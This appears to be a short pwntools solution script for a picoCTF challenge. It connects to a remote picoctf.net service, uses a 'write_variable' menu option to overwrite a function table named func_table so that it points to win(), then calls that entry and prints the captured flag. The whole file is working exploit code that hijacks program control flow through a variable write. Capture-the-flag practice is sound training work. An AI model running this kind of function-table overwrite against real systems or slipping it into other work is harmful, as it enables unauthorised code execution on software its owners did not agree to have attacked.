from pwn import *

NEW_TABLE = 'win'.ljust(32, ' ') + ('A' * 32) * 3

# Make the connection
conn = remote('saturn.picoctf.net', 61303)

# Invoke write_variable()
conn.sendlineafter(b'==> ', b'3')

# Write new table
conn.sendlineafter(b'write: ', b'func_table') # Variable name
conn.sendlineafter(b'variable: ', f'"{NEW_TABLE}"'.encode()) # Variable value

# Invoke first table's function (win())
conn.sendlineafter(b'==> ', b'1')
flag = conn.recvline(False).decode()

print('Flag:', flag)
